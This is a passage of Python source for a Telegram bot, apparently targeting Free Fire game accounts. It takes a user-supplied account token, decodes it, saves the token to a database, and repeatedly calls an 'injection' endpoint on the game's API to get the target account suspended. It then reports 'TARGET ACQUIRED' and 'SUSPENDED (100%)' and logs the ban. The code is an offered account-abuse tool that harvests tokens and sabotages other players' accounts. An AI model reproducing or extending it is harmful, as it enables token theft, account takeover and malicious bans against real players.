            try:
                await loader_msg.delete()
            except Exception:
                pass
            await update.message.reply_text(f"❌ Authentication Failed:\n`{err}`", parse_mode="Markdown")
            context.user_data["state"] = None
            await update.message.reply_text(
                "🏠 *মেইন মেনু*",
                parse_mode="Markdown",
                reply_markup=main_reply_keyboard(is_admin(user.id))
            )
            return

        user_data = decode_jwt(jwt_token)
        raw_nick = user_data.get('nickname', '')
        nickname = decode_ff_name(raw_nick)
        region = user_data.get('lock_region', user_data.get('region', 'IND'))
        account_id = user_data.get('account_id', 'Unknown')
        version = user_data.get('release_version', 'Latest')
        base_url = get_base_url(region)

        if input_is_jwt:
            db_insert_jwt_token(text, nickname, account_id, region, str(user.id))
        else:
            db_insert_access_token(text, nickname, account_id, region, str(user.id))

        try:
            await loader_msg.delete()
        except Exception:
            pass

        first_msg = await update.message.reply_text(
            f"✅ *TOKEN VALIDATED | TARGET ACQUIRED*\n\n"
            f"👤 Nickname: `{nickname}`\n"
            f"🆔 Account ID: `{account_id}`\n"
            f"🌍 Region: `{region}`\n"
            f"📦 Patch Ver: `{version}`\n\n"
            f"⏳ *Ban Injecting...*",
            parse_mode="Markdown"
        )

        inject_result = {"resp": None, "err": None}

        def do_inject():
            try:
                r = trigger_injection(jwt_token, version, base_url)
                inject_result["resp"] = r
            except Exception as e:
                inject_result["err"] = e

        inject_thread = threading.Thread(target=do_inject)
        inject_thread.start()

        inject_msg = await animated_loader(update, "INJECTING API")
        while inject_thread.is_alive():
            await asyncio.sleep(0.1)

        resp = inject_result["resp"]
        err2 = inject_result["err"]

        if err2 or resp is None:
            try:
                await first_msg.delete()
            except Exception:
                pass
            try:
                await inject_msg.delete()
            except Exception:
                pass
            await update.message.reply_text(
                f"❌ Injection Failed:\n`{err2}`",
                parse_mode="Markdown"
            )
            context.user_data["state"] = None
            await update.message.reply_text(
                "🏠 *মেইন মেনু*",
                parse_mode="Markdown",
                reply_markup=main_reply_keyboard(is_admin(user.id))
            )
            return

        retry_count = 0
        while resp.status_code != 200 and retry_count < 3:
            retry_count += 1

            retry_result = {"resp": None, "err": None}

            def do_inject_retry():
                try:
                    retry_result["resp"] = trigger_injection(jwt_token, version, base_url)
                except Exception as e:
                    retry_result["err"] = e

            retry_thread = threading.Thread(target=do_inject_retry)
            retry_thread.start()

            retry_msg = await animated_loader(update, f"RETRY {retry_count}")
            while retry_thread.is_alive():
                await asyncio.sleep(0.1)

            resp = retry_result["resp"]
            err2 = retry_result["err"]
            if err2 or resp is None:
                break
            try:
                await retry_msg.delete()
            except Exception:
                pass

        try:
            await first_msg.delete()
        except Exception:
            pass
        try:
            await inject_msg.delete()
        except Exception:
            pass

        if resp is not None and resp.status_code == 200:
            ban_check = "✅ YES — Account is BANNED"
        else:
            ban_check = "❌ NO — Account is NOT banned"

        if resp is not None and resp.status_code == 200:
            db_insert_ban_log(account_id, nickname, region, version, "SUSPENDED (100%)", str(user.id))
            await update.message.reply_text(
                f"✅ *ACCOUNT DATA INJECTED SUCCESSFULLY*\n\n"
                f"👤 Target Name: `{nickname}`\n"
                f"🆔 Target UID: `{account_id}`\n"
                f"🌍 Target Region: `{region}`\n"
                f"📦 Patch Ver: `{version}`\n"
                f"📊 Status: 💀 *SUSPENDED (100%)*\n\n"
                f"🔍 *Ban Check:* {ban_check}\n\n"
                f"👨‍💻 Developer: *YASIN BHAI*\n"
                f"📢 https://t.me/freefireob51",
                parse_mode="Markdown"
            )
        else:
            code = resp.status_code if resp is not None else "N/A"
            await update.message.reply_text(
                f"❌ *Injection Failed after retries*\n"
                f"Server status: `{code}`\n"
                f"🔍 *Ban Check:* {ban_check}",
                parse_mode="Markdown"
            )
        context.user_data["state"] = None
        await update.message.reply_text(
            "🏠 *মেইন মেনু*",
            parse_mode="Markdown",
            reply_markup=main_reply_keyboard(is_admin(user.id))
        )


# ================== MAIN ==================
def main():
    init_db()
    print("[+] Database initialized.")
    print("[+] Starting Telegram Bot...")

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("cancel", cancel_cmd))
    app.add_handler(CallbackQueryHandler(verify_callback, pattern="^verify_join$"))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    print("[+] Bot is running. Press Ctrl+C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
        sys.exit()